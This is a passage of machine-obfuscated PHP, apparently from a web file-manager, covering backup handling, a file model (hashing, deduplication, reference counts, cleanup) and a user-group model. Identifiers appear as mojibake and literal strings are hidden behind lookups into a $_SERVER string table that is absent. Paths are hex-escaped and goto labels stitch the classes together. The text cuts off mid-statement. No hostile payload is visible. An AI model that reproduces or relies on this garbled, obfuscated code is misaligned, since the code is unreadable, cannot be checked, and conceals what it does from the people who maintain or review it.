public function __construct() { } public function index() { $ÆÙéÓ¶ =& $_SERVER[ú‡®¯¨±]; $â¢ú‹Ÿ = Backup::get(); $¶ûÙ·íÍ = $â¢ú‹Ÿ[$ÆÙéÓ¶[32]]; $¶­‚ÁË‰ = $this->tmpFilesPath() . "\142\141\143\153\165\160\x5f{$¶ûÙ·íÍ}\57"; $ßÒ¢½ß = $this->backupPath($â¢ú‹Ÿ); if (!($ßÒ¢½ß = IO::mkdir($ßÒ¢½ß))) { return !1; } $¾ÏÓ‚Š° = IO::listPath($¶­‚ÁË‰); $ÕÄáü± = isset($¾ÏÓ‚Š°[$ÆÙéÓ¶[85]]) ? $¾ÏÓ‚Š°[$ÆÙéÓ¶[85]] : array(); $ÇŞà‹€¦ = array_sum(array_column($ÕÄáü±, $ÆÙéÓ¶[78])); if (!$ÇŞà‹€¦) { return !1; } $¬Ö†¡­Õ = array($ÆÙéÓ¶[853] => $ÇŞà‹€¦, $ÆÙéÓ¶[854] => time()); Backup::set($¬Ö†¡­Õ); $Óì™­Ú = new TaskFileTransfer($ÆÙéÓ¶[855], $ÆÙéÓ¶[835], count($ÕÄáü±), LNG($ÆÙéÓ¶[836]) . $ÆÙéÓ¶[440] . LNG($ÆÙéÓ¶[838]) . $ÆÙéÓ¶[856]); $Óì™­Ú->task[$ÆÙéÓ¶[818]] = $ÇŞà‹€¦; foreach ($¾ÏÓ‚Š°[$ÆÙéÓ¶[85]] as $ßè‰ÕŸ¾) { $°ÕÑ¦ŸÄ = IO::move($ßè‰ÕŸ¾[$ÆÙéÓ¶[86]], $ßÒ¢½ß); if (!$°ÕÑ¦ŸÄ) { $Óì™­Ú->end(); $©ùë³ı = IO::getLastError($ÆÙéÓ¶[857] . $ßè‰ÕŸ¾[$ÆÙéÓ¶[86]] . $ÆÙéÓ¶[858] . $ßÒ¢½ß . $ÆÙéÓ¶[167]); write_log($©ùë³ı, $ÆÙéÓ¶[835]); return !1; } } $É¹ğËäµ = new DbManage(); $ÛÍ„ÏÙ‚ = $É¹ğËäµ->getSqlFile(); if (!$ÛÍ„ÏÙ‚[$ÆÙéÓ¶[859]] || !$ÛÍ„ÏÙ‚[$ÆÙéÓ¶[13]]) { return !1; } IO::move($ÛÍ„ÏÙ‚[$ÆÙéÓ¶[859]], $ßÒ¢½ß); IO::move($ÛÍ„ÏÙ‚[$ÆÙéÓ¶[13]], $ßÒ¢½ß); $Óì™­Ú->end(); $¬Ö†¡­Õ = array($ÆÙéÓ¶[860] => $ÇŞà‹€¦, $ÆÙéÓ¶[861] => time()); Backup::set($¬Ö†¡­Õ); return !0; } private function backupPath($‘ê¸İ„‹) { $©¥³á€‡ =& $_SERVER[ú‡®¯¨±]; $æöéÑÁŠ = $‘ê¸İ„‹[$©¥³á€‡[32]]; $…ŒûÍøû = Model($©¥³á€‡[825])->get($©¥³á€‡[826]); $Í´îƒ¿Ë = substr(md5($©¥³á€‡[827] . $…ŒûÍøû . $æöéÑÁŠ), 0, 8); return "\x7b\x69\x6f\72{$‘ê¸İ„‹[$©¥³á€‡[806]]}\x7d\x2f\x64\x61\164\141\x62\141\x73\145\57\x62\141\143\x6b\x75\x70\x2f" . $æöéÑÁŠ . $©¥³á€‡[11] . $Í´îƒ¿Ë; } private function tmpFilesPath() { $…ùš²Õ =& $_SERVER[ú‡®¯¨±]; $ô‰†Ê“¾ = TEMP_FILES; if ($GLOBALS[$…ùš²Õ[6]][$…ùš²Õ[91]][$…ùš²Õ[851]]) { $ô‰†Ê“¾ = $GLOBALS[$…ùš²Õ[6]][$…ùš²Õ[91]][$…ùš²Õ[851]]; if (!mk_dir($ô‰†Ê“¾) || !is_writable($ô‰†Ê“¾) || !IO::mkfile($ô‰†Ê“¾ . $…ùš²Õ[852])) { $ô‰†Ê“¾ = TEMP_FILES; } } return $ô‰†Ê“¾; } } goto Fá•¢¯—‹‹; c«Ø Áİù‰: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\145\x5f\143\157\x6e\164\x65\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\124\151\155\145", "\164\x69\x6d\145", "\151\156\163\x65\x72\x74", "\x66\x75\156\143\x74\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\155\x65" => "\x69\157\137\146\151\x6c\x65\137\155\145\164\x61", "\x6d\145\x74\x61\x46\x69\x65\154\144" => "\146\x69\154\145\x49\104"); public function fileInfo($èÓ—û´·) { $šîÊĞá =& $_SERVER[ú‡®¯¨±]; static $–º›øüï = array(); if (!isset($–º›øüï[$èÓ—û´·])) { $æ˜ÔÌ­“ = $šîÊĞá[1955]; $¾ÂÓçé¯ = Model($šîÊĞá[522])->field($æ˜ÔÌ­“)->where(array($šîÊĞá[520] => $èÓ—û´·))->find(); $–º›øüï[$èÓ—û´·] = $¾ÂÓçé¯; } return $–º›øüï[$èÓ—û´·]; } public function addFileByContent($Š›¯ÕÛÑ = '', $é´û™˜Ğ = '') { $šøãœÏ• =& $_SERVER[ú‡®¯¨±]; $å›Î«ÜŞ = TEMP_PATH . $šøãœÏ•[1956]; if (!is_dir($å›Î«ÜŞ)) { mk_dir($å›Î«ÜŞ); } $ªĞ¤ÓƒĞ = $å›Î«ÜŞ . $šøãœÏ•[1957] . rand_string(16); file_put_contents($ªĞ¤ÓƒĞ, $Š›¯ÕÛÑ); $¡Ñ±¿å = $this->addFile($ªĞ¤ÓƒĞ, $é´û™˜Ğ, !0); if (file_exists($ªĞ¤ÓƒĞ)) { @unlink($ªĞ¤ÓƒĞ); } return $¡Ñ±¿å; } public function createFileName($ÅĞ²’ê, $ÈõÀ¥…ß = false, $ø¿§Ÿ† = false) { $ıóÙ¸â =& $_SERVER[ú‡®¯¨±]; $ùÀÇä”ı = IO::init($ıóÙ¸â[8]); $…èúúØê = $this->makeFilePath($ÅĞ²’ê, $ùÀÇä”ı, $ÈõÀ¥…ß, $ø¿§Ÿ†); $íÌ«ÜÒ– = $ùÀÇä”ı->pathFather($…èúúØê); static $É‚ª´ö = false; $Ä¿ßíë… = $ıóÙ¸â[1958] . md5($íÌ«ÜÒ–); if (!$É‚ª´ö && !Cache::get($Ä¿ßíë…)) { $É‚ª´ö = !0; $‘Ü¨êç– = IO::mkdir($íÌ«ÜÒ–); if (!IO::exist($‘Ü¨êç– . $ıóÙ¸â[852])) { IO::mkfile($‘Ü¨êç– . $ıóÙ¸â[852]); } Cache::set($Ä¿ßíë…, 1, 3600 * 2); } return $…èúúØê; } public function makeFilePath($†ë˜›Å‘, $Û¼âÎàÙ, $ÉçÄöåÄ = false, $À¤ÈŞ¸É = false) { $›§ªúüù =& $_SERVER[ú‡®¯¨±]; $ğ‰‚Ãèù = Model($›§ªúüù[825])->get($›§ªúüù[1959]); $‘íæšúû = KodIO::defaultIO() . date($›§ªúüù[1960]); $’Ÿëİ¾° = $‘íæšúû . rand_string(5) . short_id(100); $†ë˜›Å‘ = str_replace($›§ªúüù[8], $›§ªúüù[11], KodIO::clear($†ë˜›Å‘)); $…æüŒùõ = $Û¼âÎàÙ->ext($†ë˜›Å‘); if (!$†ë˜›Å‘) { $ğ‰‚Ãèù = $›§ªúüù[1961]; } switch ($ğ‰‚Ãèù) { case $›§ªúüù[1962]: $’Ÿëİ¾° = $’Ÿëİ¾° . $›§ªúüù[10] . $Û¼âÎàÙ->ext($†ë˜›Å‘); if ($…æüŒùõ == $›§ªúüù[1899]) { $’Ÿëİ¾° .= $›§ªúüù[1262]; } break; case $›§ªúüù[1963]: $Ã±íãšƒ = Model($›§ªúüù[825])->get($›§ªúüù[826]); $­Ì¯ÆÇ— = substr(md5($›§ªúüù[827] . $Ã±íãšƒ . date($›§ªúüù[803])), 0, 8); $Æ‹åœÕÁ = KodIO::defaultDriver(); $‘íæšúû = $›§ªúüù[1293] . $Æ‹åœÕÁ[$›§ªúüù[453]] . $›§ªúüù[462] . date($›§ªúüù[1964]) . $­Ì¯ÆÇ— . $›§ªúüù[8]; if ($…æüŒùõ == $›§ªúüù[1899]) { $†ë˜›Å‘ .= $›§ªúüù[1262]; } $ÜğÅ˜Ò« = $›§ªúüù[1965] . $‘íæšúû . $†ë˜›Å‘; CacheLock::lock($ÜğÅ˜Ò«); $’Ÿëİ¾° = $‘íæšúû . $†ë˜›Å‘; if (IO::exist($‘íæšúû . $†ë˜›Å‘)) { $ÕÍ‘Òä = substr($†ë˜›Å‘, 0, strlen($†ë˜›Å‘) - strlen($…æüŒùõ)); $¤º„± = $À¤ÈŞ¸É ? substr($À¤ÈŞ¸É, 0, 5) : ($ÉçÄöåÄ ? substr($ÉçÄöåÄ, 0, 5) : rand_string(5)); $’Ÿëİ¾° = $‘íæšúû . $ÕÍ‘Òä . $¤º„± . $›§ªúüù[10] . $…æüŒùõ; } if (IO::isTypeObject($’Ÿëİ¾°) && !IO::isUploadServer($’Ÿëİ¾°)) { if (IO::exist($’Ÿëİ¾°)) { return $’Ÿëİ¾°; } $õì¾ª¾ò = IO::setContent($’Ÿëİ¾°, $›§ªúüù[12]); if (!$õì¾ª¾ò) { show_json($›§ªúüù[1966], !1); } } CacheLock::unlock($ÜğÅ˜Ò«); break; case $›§ªúüù[1961]: break; default: break; } return $’Ÿëİ¾°; } public function addFileByRemote($´  îÀç, $¶úã‹Œ—, $ƒ÷“æŸ­ = array()) { $½ˆªˆ¶ =& $_SERVER[ú‡®¯¨±]; if (!IO::exist($´  îÀç)) { return !1; } $©¿©şİ‡ = $ƒ÷“æŸ­[$½ˆªˆ¶[525]] ? $ƒ÷“æŸ­[$½ˆªˆ¶[525]] : $½ˆªˆ¶[12]; $şÈâÚŠ = IO::hashMd5($´  îÀç, $©¿©şİ‡); $ô°ì¸ = KodIO::defaultDriver(); $ˆ×í« = array($½ˆªˆ¶[595] => IO::size($´  îÀç), $½ˆªˆ¶[1967] => 1, $½ˆªˆ¶[472] => $¶úã‹Œ—, $½ˆªˆ¶[863] => $ô°ì¸[$½ˆªˆ¶[453]], $½ˆªˆ¶[473] => $´  îÀç, $½ˆªˆ¶[1968] => $ƒ÷“æŸ­[$½ˆªˆ¶[650]] ? $ƒ÷“æŸ­[$½ˆªˆ¶[650]] : IO::hashSimple($´  îÀç), $½ˆªˆ¶[1969] => $şÈâÚŠ ? $şÈâÚŠ : $©¿©şİ‡); if ($†Š÷ ƒ‰ = $this->addFileCheckExist($ˆ×í«[$½ˆªˆ¶[650]], $ˆ×í«[$½ˆªˆ¶[525]], $ˆ×í«[$½ˆªˆ¶[78]])) { return $†Š÷ ƒ‰; } return $this->addFileData($ˆ×í«); } private function addFileData($¾¹ûÕ”) { $ë¨ã²¦ =& $_SERVER[ú‡®¯¨±]; if (!$¾¹ûÕ”) { return !1; } $¾¹ûÕ”[$ë¨ã²¦[78]] = intval($¾¹ûÕ”[$ë¨ã²¦[78]]); if (!$¾¹ûÕ”[$ë¨ã²¦[78]] && strlen($¾¹ûÕ”[$ë¨ã²¦[650]]) > 32) { $¾¹ûÕ”[$ë¨ã²¦[78]] = intval(substr($¾¹ûÕ”[$ë¨ã²¦[650]], 32)); } $³ÏîÅùÄ = $this->add($¾¹ûÕ”); return $this->find($³ÏîÅùÄ); } public function addFile($Ä ¯•øÂ, $Ù€İ¬Â, $îŸ¶¥û = false) { $ÑºË¡¾Š =& $_SERVER[ú‡®¯¨±]; $ÔˆÅóë = IO::hashSimple($Ä ¯•øÂ); $³‚”İ·µ = IO::size($Ä ¯•øÂ); $·„Ñ¤€† = $³‚”İ·µ <= 1024 * 1024 * 10 ? IO::hashMd5($Ä ¯•øÂ) : $ÑºË¡¾Š[12]; $¢Äô»ï´ = $ÑºË¡¾Š[1970] . $ÔˆÅóë; CacheLock::lock($¢Äô»ï´); if ($·„Ñ¤€† && $ÔˆÅóë) { $’Åº¸¹À = $this->addFileCheckExist($ÔˆÅóë, $·„Ñ¤€†, $³‚”İ·µ); if ($’Åº¸¹À) { CacheLock::unlock($¢Äô»ï´); return $’Åº¸¹À; } } $«Ö¯€°õ = $this->addFileMake($Ä ¯•øÂ, $³‚”İ·µ, $ÔˆÅóë, $·„Ñ¤€†, $Ù€İ¬Â, $îŸ¶¥û); $ÌÉ¯™œ = $this->addFileData($«Ö¯€°õ); CacheLock::unlock($¢Äô»ï´); if (!$·„Ñ¤€† && $ÌÉ¯™œ) { $this->fileMd5Check($ÌÉ¯™œ); } return $ÌÉ¯™œ; } public function fileMd5Check($«ûÆ”ª¼) { $ÍÜİš =& $_SERVER[ú‡®¯¨±]; $’Î¤ÔÖë = array($«ûÆ”ª¼[$ÍÜİš[519]], $«ûÆ”ª¼[$ÍÜİš[86]]); $ùÔĞ³Ç« = $ÍÜİš[1971] . $«ûÆ”ª¼[$ÍÜİš[86]]; $ŒÎ£¹¡ = $ÍÜİš[1972] . $«ûÆ”ª¼[$ÍÜİš[519]]; TaskQueue::add($ÍÜİš[1973], $’Î¤ÔÖë, $ùÔĞ³Ç«, $ŒÎ£¹¡); } public function fileMd5Set($÷Ş€²ï³, $öÍåà¿) { $Şª ½Æ  =& $_SERVER[ú‡®¯¨±]; $Ç°’Íí = $this->find($÷Ş€²ï³); if (!$Ç°’Íí || $Ç°’Íí[$Şª ½Æ [525]]) { return; } $ş…ŞŠÖÈ = IO::hashMd5($öÍåà¿); if (!$ş…ŞŠÖÈ) { return $Şª ½Æ [12]; } $this->where(array($Şª ½Æ [519] => $÷Ş€²ï³))->save(array($Şª ½Æ [525] => $ş…ŞŠÖÈ)); } public function addFileMake($ŒŸÙÆİÃ, $ÜÁàæ õ, $ŠÛìêŠ, $’ùâ ³¨, $••Š’ÖĞ, $ÛŸ°ƒÓ™) { $à’Ì†”Ì =& $_SERVER[ú‡®¯¨±]; $¬ºŒˆ›À = $this->createFileName($••Š’ÖĞ, $ŠÛìêŠ, $’ùâ ³¨); $•æ½‘ã = get_path_father($¬ºŒˆ›À); $óåÑâ = get_path_this($¬ºŒˆ›À); if ($ÛŸ°ƒÓ™) { $ÌÌÅÏòö = IO::move($ŒŸÙÆİÃ, $•æ½‘ã, !1, $óåÑâ); } else { $ÌÌÅÏòö = IO::copy($ŒŸÙÆİÃ, $•æ½‘ã, !1, $óåÑâ); } if (!$ÌÌÅÏòö) { return !1; } $Ç½êë“© = KodIO::defaultDriver(); $Áß’ƒ¼¶ = array($à’Ì†”Ì[595] => $ÜÁàæ õ, $à’Ì†”Ì[1967] => 1, $à’Ì†”Ì[472] => $••Š’ÖĞ, $à’Ì†”Ì[863] => $Ç½êë“©[$à’Ì†”Ì[453]], $à’Ì†”Ì[473] => $¬ºŒˆ›À, $à’Ì†”Ì[1968] => $ŠÛìêŠ, $à’Ì†”Ì[1969] => $’ùâ ³¨); return $Áß’ƒ¼¶; } public function addFileCheckExist($²©ü¦¤, $Ûç¼ˆ¦¥, $ó„¿Ÿí–) { $ÎÕâÃ© =& $_SERVER[ú‡®¯¨±]; $¤‘¯¦ä = $this->findByHash($²©ü¦¤, $Ûç¼ˆ¦¥); if (!$¤‘¯¦ä) { return !1; } $”İÎĞƒè = array($ÎÕâÃ©[1967] => intval($¤‘¯¦ä[$ÎÕâÃ©[1974]]) + 1, $ÎÕâÃ©[595] => $ó„¿Ÿí–); $this->where(array($ÎÕâÃ©[520] => $¤‘¯¦ä[$ÎÕâÃ©[519]]))->save($”İÎĞƒè); return $¤‘¯¦ä; } public function remove($‡İşçüä) { $this->linkCountChange($‡İşçüä, !1); $this->clearEmpty(); return !0; } public function linkAdd($À¿çÍúÂ) { $this->linkCountChange($À¿çÍúÂ, !0); } public function linkCountChange($Âï•ãû©, $ïªŠ·) { $ã‡öò­‹ =& $_SERVER[ú‡®¯¨±]; if (!$Âï•ãû©) { return; } if (!is_array($Âï•ãû©)) { $Âï•ãû© = array($Âï•ãû©); } $Ç—ÑÉÇ = array(); foreach ($Âï•ãû© as $¦ÅÁåüÒ) { $ÙĞ‘…ßÌ = $¦ÅÁåüÒ . $ã‡öò­‹[12]; if (!$Ç—ÑÉÇ[$ÙĞ‘…ßÌ]) { $Ç—ÑÉÇ[$ÙĞ‘…ßÌ] = 0; } $Ç—ÑÉÇ[$ÙĞ‘…ßÌ]++; } $«ºÁïÁ± = array(); foreach ($Ç—ÑÉÇ as $¦ÅÁåüÒ => $å¯Ğù–) { $ÙĞ‘…ßÌ = $å¯Ğù– . $ã‡öò­‹[12]; if (!$«ºÁïÁ±[$ÙĞ‘…ßÌ]) { $«ºÁïÁ±[$ÙĞ‘…ßÌ] = array(); } $«ºÁïÁ±[$ÙĞ‘…ßÌ][] = $¦ÅÁåüÒ; } foreach ($«ºÁïÁ± as $å¯Ğù– => $ˆÌ¼ÜŞ€) { if (!$ˆÌ¼ÜŞ€) { continue; } $å¯Ğù– = $ïªŠ· ? $å¯Ğù– : -intval($å¯Ğù–); $‰Ù¨èÄï = array($ã‡öò­‹[519] => array($ã‡öò­‹[7], $ˆÌ¼ÜŞ€)); if ($å¯Ğù– < 0) { $‰Ù¨èÄï[$ã‡öò­‹[1974]] = array($ã‡öò­‹[1071], abs($å¯Ğù–)); } $this->where($‰Ù¨èÄï)->setAdd($ã‡öò­‹[1974], $å¯Ğù–); } } public function findByHash($®‡¼¤ñ, $Èä†—®Ï = false) { $Ñ˜Â”Éœ =& $_SERVER[ú‡®¯¨±]; if (!$®‡¼¤ñ && !$Èä†—®Ï) { return !1; } $Ïœ”ÆË = array($Ñ˜Â”Éœ[1968] => $®‡¼¤ñ); if ($Èä†—®Ï) { $Ïœ”ÆË = array($Ñ˜Â”Éœ[1969] => $Èä†—®Ï); } return $this->order($Ñ˜Â”Éœ[1975])->where($Ïœ”ÆË)->find(); } public function clearEmpty($²›Š±×ˆ = 0) { $ÁÖ’¦Èª =& $_SERVER[ú‡®¯¨±]; $›Ÿ† œÚ = time() - 3600 * 24 * $²›Š±×ˆ; $Ş‘³½É = $ÁÖ’¦Èª[1976] . $›Ÿ† œÚ; $ÕÍÆ¶ = $this->where($Ş‘³½É)->select(); if (!$ÕÍÆ¶) { return; } $šß‰öË¹ = new Task($ÁÖ’¦Èª[1977], $ÁÖ’¦Èª[12], count($ÕÍÆ¶)); foreach ($ÕÍÆ¶ as $òù²×¡Ã) { $šß‰öË¹->update(1); $this->resetFile($òù²×¡Ã); } $šß‰öË¹->end(); } public function resetFile($„Ÿ¶ˆç) { $»¥ô—í =& $_SERVER[ú‡®¯¨±]; $•¬ÛÙ‚Ô = array($»¥ô—í[520] => $„Ÿ¶ˆç[$»¥ô—í[519]]); $Ÿà‘ùÜ¤ = Model($»¥ô—í[1389])->where($•¬ÛÙ‚Ô)->count(); $¸éğ‹¼ç = Model($»¥ô—í[1978])->where($•¬ÛÙ‚Ô)->count(); $ø‘şÇàò = intval($Ÿà‘ùÜ¤) + intval($¸éğ‹¼ç); if ($ø‘şÇàò == 0) { IO::remove($„Ÿ¶ˆç[$»¥ô—í[86]]); Model($»¥ô—í[1979])->delete($„Ÿ¶ˆç[$»¥ô—í[519]]); $this->where($•¬ÛÙ‚Ô)->delete(); $this->metaSet($„Ÿ¶ˆç[$»¥ô—í[519]], null, null); return; } if ($„Ÿ¶ˆç[$»¥ô—í[1974]] != $ø‘şÇàò) { $this->where($•¬ÛÙ‚Ô)->save(array($»¥ô—í[1967] => $ø‘şÇàò)); } } public function storageInfo($”µ“«ÂÆ = false) { $şà¡ñŠÌ =& $_SERVER[ú‡®¯¨±]; $àòúÅ¯– = $this->count() + 0.0; $ãÅûÌ¹Â = 0; $Íà˜‡õ‰ = 1; $İÑ«áÉú = 0; $ÄäÑÉ…º = 5000; for ($¹œËåÉ = 0; $¹œËåÉ < $àòúÅ¯–; $¹œËåÉ = $¹œËåÉ + $ÄäÑÉ…º) { $‘æû”òË = $this->limit($¹œËåÉ, $¹œËåÉ + $ÄäÑÉ…º)->select(); foreach ($‘æû”òË as $ïÜÔğ–) { $Íà˜‡õ‰ += $ïÜÔğ–[$şà¡ñŠÌ[78]] * $ïÜÔğ–[$şà¡ñŠÌ[1974]]; $ãÅûÌ¹Â += $ïÜÔğ–[$şà¡ñŠÌ[78]] * ($ïÜÔğ–[$şà¡ñŠÌ[1974]] - 1); $İÑ«áÉú += $ïÜÔğ–[$şà¡ñŠÌ[1974]]; } } $Á’ˆ ö¬ = array($şà¡ñŠÌ[1980] => $Íà˜‡õ‰, $şà¡ñŠÌ[1981] => $ãÅûÌ¹Â, $şà¡ñŠÌ[1982] => $ãÅûÌ¹Â / $Íà˜‡õ‰, $şà¡ñŠÌ[82] => $àòúÅ¯–, $şà¡ñŠÌ[1983] => $İÑ«áÉú); return $Á’ˆ ö¬; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\164\x61\142\154\x65\116\x61\x6d\145" => "\147\162\157\x75\160\x5f\155\145\x74\141", "\x6d\145\x74\x61\106\x69\145\154\144" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($Ô¬ù˜á¶) { $ú¤¾…ö =& $_SERVER[ú‡®¯¨±]; return array($ú¤¾…ö[1984] => array($Ô¬ù˜á¶[0], $ú¤¾…ö[1985]), $ú¤¾…ö[1986] => array($Ô¬ù˜á¶[0], $ú¤¾…ö[1987])); } protected function getInfo($Ùïì®­Š, $øˆïëşâ = false) { $‹¸’ªÁá = $this->getInfoSimple($Ùïì®­Š); if (!$‹¸’ªÁá) { return !1; } if ($øˆïëşâ) { return $this->_listDataApplyItem($‹¸’ªÁá); } return $this->cacheFunctionGet($_SERVER[ú‡®¯¨±][1988], $Ùïì®­Š); } protected function getInfoSimple($œö³®èõ, $ÏŒ‡øû† = false) { $–ÕÇ¹—š =& $_SERVER[ú‡®¯¨±]; if ($ÏŒ‡øû†) { $ÙŸ¤Ø” = array($–ÕÇ¹—š[1906] => intval($œö³®èõ)); $üû õ‡€ = $this->where($ÙŸ¤Ø”)->find(); return is_array($üû õ‡€) ? $üû õ‡€ : array(); } return $this->cacheFunctionGet($–ÕÇ¹—š[1989], $œö³®èõ); } protected function groupAdd($ÌÙ‚¨ÉÌ) { $ë»³˜ =& $_SERVER[ú‡®¯¨±]; if (!$ÌÙ‚¨ÉÌ[$ë»³˜[182]] && isset($ÌÙ‚¨ÉÌ[$ë»³˜[1906]]) && $ÌÙ‚¨ÉÌ[$ë»³˜[1906]] == 1) { if ($çÜá“±ß = $this->getInfoSimple($ÌÙ‚¨ÉÌ[$ë»³˜[1906]], !0)) { return $ÌÙ‚¨ÉÌ[$ë»³˜[1906]]; } } else { $çÜá“±ß = $this->getInfoSimple($ÌÙ‚¨ÉÌ[$ë»³˜[182]]); if (!$çÜá“±ß) { return !1; } } $¥ìŒ»Ø = $ë»³˜[573]; if ($çÜá“±ß[$ë»³˜[563]]) { $¥ìŒ»Ø = $çÜá“±ß[$ë»³˜[563]] . $çÜá“±ß[$ë»³˜[1906]] . $ë»³˜[50]; } $øÕ¶˜‹ = array($ë»³˜[472] => $this->groupNameAuto($ÌÙ‚¨ÉÌ[$ë»³˜[182]], $ÌÙ‚¨ÉÌ[$ë»³˜[32]]), $ë»³˜[455] => $ÌÙ‚¨ÉÌ[$ë»³˜[182]], $ë»³˜[630] => $¥ìŒ»Ø, $ë»³˜[1990] => $ÌÙ‚¨ÉÌ[$ë»³˜[1893]], $ë»³˜[1991] => 0, $ë»³˜[1910] => 0); if (isset($ÌÙ‚¨ÉÌ[$ë»³˜[1930]])) { $øÕ¶˜‹[$ë»³˜[1930]] = $ÌÙ‚¨ÉÌ[$ë»³˜[1930]]; } else { $×«Œä = $this->max($ë»³˜[1930]); if (!$×«Œä) { $×«Œä = 0; } $øÕ¶˜‹[$ë»³˜[1930]] = $×«Œä + 1; } if (!empty($ÌÙ‚¨ÉÌ[$ë»³˜[1906]])) { $øÕ¶˜‹[$ë»³˜[1906]] = $ÌÙ‚¨ÉÌ[$ë»³˜[1906]]; } $Ó±†Ñ€ = $this->add($øÕ¶˜‹); $this->setNamePinyin($Ó±†Ñ€, $øÕ¶˜‹[$ë»³˜[32]]); if (isset($ÌÙ‚¨ÉÌ[$ë»³˜[1992]])) { $this->metaSet($Ó±†Ñ€, array($ë»³˜[1992] => $ÌÙ‚¨ÉÌ[$ë»³˜[1992]], $ë»³˜[1993] => $ÌÙ‚¨ÉÌ[$ë»³˜[1993]])); unset($ÌÙ‚¨ÉÌ[$ë»³˜[1992]]); unset($ÌÙ‚¨ÉÌ[$ë»³˜[1993]]); } Model($ë»³˜[1389])->groupRootAdd($Ó±†Ñ€); $this->_clearCache($ÌÙ‚¨ÉÌ[$ë»³˜[182]]); return $Ó±†Ñ€; } protected function groupEdit($½º§³¼¡, $ĞÚõÑ÷) { $…êŠ›Í =& $_SERVER[ú‡®¯¨±]; $üËÖ™ºé = $this->getInfoSimple($½º§³¼¡); if (!$üËÖ™ºé) { return !1; } if (!empty($ĞÚõÑ÷[$…êŠ›Í[182]])) { $¶­ïÔ´Î = $this->getInfoSimple($ĞÚõÑ÷[$…êŠ›Í[182]]); if (!$¶­ïÔ´Î) { return !1; } if ($üËÖ™ºé[$…êŠ›Í[1906]] == $¶­ïÔ´Î[$…êŠ›Í[1906]]) { return !1; } if ($ĞÚõÑ÷[$…êŠ›Í[182]] != $üËÖ™ºé[$…êŠ›Í[182]]) { if ($¶­ïÔ´Î[$…êŠ›Í[563]] !== $üËÖ™ºé[$…êŠ›Í[563]] && strpos($¶­ïÔ´Î[$…êŠ›Í[563]], $üËÖ™ºé[$…êŠ›Í[563]] . $üËÖ™ºé[$…êŠ›Í[1906]] . $…êŠ›Í[50]) === 0) { return !1; } $ĞÚõÑ÷[$…êŠ›Í[630]] = $¶­ïÔ´Î[$…êŠ›Í[563]] . $ĞÚõÑ÷[$…êŠ›Í[182]] . $…êŠ›Í[50]; $this->_changeChildLevel($üËÖ™ºé, $¶­ïÔ´Î); $this->_clearCache($¶­ïÔ´Î[$…êŠ›Í[1906]]); $this->_clearCache($üËÖ™ºé[$…êŠ›Í[182]]); } } if (isset($ĞÚõÑ÷[$…êŠ›Í[32]])) { $this->setNamePinyin($½º§³¼¡, $ĞÚõÑ÷[$…êŠ›Í[32]]); } if (isset($ĞÚõÑ÷[$…êŠ›Í[1992]])) { $this->metaSet($½º§³¼¡, array($…êŠ›Í[1992] => $ĞÚõÑ÷[$…êŠ›Í[1992]], $…êŠ›Í[1993] => $ĞÚõÑ÷[$…êŠ›Í[1993]])); unset($ĞÚõÑ÷[$…êŠ›Í[1992]]); unset($ĞÚõÑ÷[$…êŠ›Í[1993]]); } $this->_clearChildrenCache($üËÖ™ºé); return $this->where(array($…êŠ›Í[1994] => $½º§³¼¡))->save($ĞÚõÑ÷); } private function _clearChildrenCache($Î™ÎîÂı) { $ş„›í£ú =& $_SERVER[ú‡®¯¨±]; $ç©¡ùá„ = array($ş„›í£ú[630] => array($ş„›í£ú[590], $Î™ÎîÂı[$ş„›í£ú[563]] . $Î™ÎîÂı[$ş„›í£ú[1906]] . $ş„›í£ú[591])); $ …Åöˆ¿ = $this->field($ş„›í£ú[1906])->where($ç©¡ùá„)->select(); foreach ($ …Åöˆ¿ as $Î®Ñˆâ) { $this->_clearCache($Î®Ñˆâ[$ş„›í£ú[1906]]); } } private function _clearCache($¨ÖôÍ‘è) { $–ø²“¹ =& $_SERVER[ú‡®¯¨±]; $this->cacheFunctionClear($–ø²“¹[1988], $¨ÖôÍ‘è); $this->cacheFunctionClear($–ø²“¹[1989], $¨ÖôÍ‘è); } private function _changeChildLevel($Ğ†˜Æ¥à, $¿€ôé‰Ü, $µøË’§Æ = false) { $ğ×¢…Øˆ =& $_SERVER[ú‡®¯¨±]; $Ìİš•õ = $Ğ†˜Æ¥à[$ğ×¢…Øˆ[563]] . $Ğ†˜Æ¥à[$ğ×¢…Øˆ[1906]] . $ğ×¢…Øˆ[50]; $ÃËÆõ±ş = $¿€ôé‰Ü[$ğ×¢…Øˆ[563]] . $¿€ôé‰Ü[$ğ×¢…Øˆ[1906]] . $ğ×¢…Øˆ[50] . $Ğ†˜Æ¥à[$ğ×¢…Øˆ[1906]] . $ğ×¢…Øˆ[50]; if ($µøË’§Æ) { $ÃËÆõ±ş = $¿€ôé‰Ü[$ğ×¢…Øˆ[563]] . $¿€ôé‰Ü[$ğ×¢…Øˆ[1906]] . $ğ×¢…Øˆ[50]; } $¶† ñşß = array($ğ×¢…Øˆ[630] => array($ğ×¢…Øˆ[590], $Ğ†˜Æ¥à[$ğ×¢…Øˆ[563]] . $Ğ†˜Æ¥à[$ğ×¢…Øˆ[1906]] . $ğ×¢…Øˆ[591])); $ûü©¨Æï = array($ğ×¢…Øˆ[630] => array($ğ×¢…Øˆ[639], "\162\145\160\x6c\x61\143\145\50\x70\x61\x72\145\x6e\164\x4c\x65\166\145\x6c\x2c\x27{$Ìİš•õ}\47\x2c\47{$ÃËÆõ±ş}\47\51")); $this->_clearChildrenCache($Ğ†˜Æ¥à); $this->where($¶† ñşß)->data($ûü©¨Æï)->save(); } public function setNamePinyin($õŒ¿©¡´, $Íç’ˆšø = false) { $½ä¶–ûº =& $_SERVER[ú‡®¯¨±]; if (!$Íç’ˆšø) { $îÏ—†Ø = $this->getInfoSimple($õŒ¿©¡´); $Íç’ˆšø = $îÏ—†Ø[$½ä¶–ûº[32]]; } if (!Input::check($Íç’ˆšø, $½ä¶–ûº[633])) { $this->metaSet($õŒ¿©¡´, $½ä¶–ûº[516], null); $this->metaSet($õŒ¿©¡´, $½ä¶–ûº[515], null); return; } $òà—¬» = array($½ä¶–ûº[516] => str_replace($½ä¶–ûº[53], $½ä¶–ûº[12], Pinyin::get($Íç’ˆšø)), $½ä¶–ûº[515] => 